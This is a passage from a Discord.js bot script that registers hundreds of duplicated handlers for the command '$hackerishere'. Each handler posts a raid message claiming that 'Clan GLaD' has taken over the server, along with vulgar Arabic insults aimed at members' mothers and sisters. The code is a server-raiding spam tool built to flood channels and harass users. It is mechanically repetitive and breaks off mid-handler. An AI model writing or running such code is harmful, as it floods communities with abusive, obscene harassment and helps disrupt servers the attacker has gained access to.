        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
